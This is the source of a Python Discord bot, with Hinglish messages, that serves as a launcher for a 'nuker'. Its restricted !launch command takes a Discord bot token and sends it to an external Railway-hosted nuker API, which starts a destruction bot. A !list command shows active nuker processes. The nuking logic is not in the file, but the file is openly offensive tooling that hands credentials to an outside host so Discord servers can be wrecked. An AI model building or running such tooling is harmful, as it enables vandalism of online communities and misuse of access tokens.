import discord
from discord.ext import commands
import aiohttp
import os

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

AUTHORIZED_USER_ID = 1177294135313584138
NUKER_API_URL = "https://nuker-api.up.railway.app"  # ⭐ Railway URL (baad mein dalna)

@bot.event
async def on_ready():
    print(f"Main bot online: {bot.user}")

@bot.command(name='launch')
async def launch(ctx, token: str = None):
    if ctx.author.id != AUTHORIZED_USER_ID:
        await ctx.send("❌ Permission nahi.")
        return

    if token is None:
        await ctx.send("❌ Token do.")
        return

    await ctx.send("⏳ Nuker bot start kar raha hoon...")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(f"{NUKER_API_URL}/start", 
                                   json={"token": token}) as resp:
                result = await resp.json()
                
                if resp.status == 200:
                    await ctx.send(f"✅ Nuker bot start ho gaya! PID: {result.get('pid')}")
                else:
                    await ctx.send(f"❌ Error: {result.get('error')}")
    except Exception as e:
        await ctx.send(f"❌ API connection failed: {str(e)}")

@bot.command(name='list')
async def list_bots(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{NUKER_API_URL}/list") as resp:
                result = await resp.json()
                pids = result.get('active_pids', [])
                
                if not pids:
                    await ctx.send("Koi active bot nahi.")
                else:
                    await ctx.send(f"Active bots: {pids}")
    except Exception as e:
        await ctx.send(f"❌ API connection failed: {str(e)}")

bot.run(os.environ.get("MAIN_BOT_TOKEN"))  # Environment variable use karo
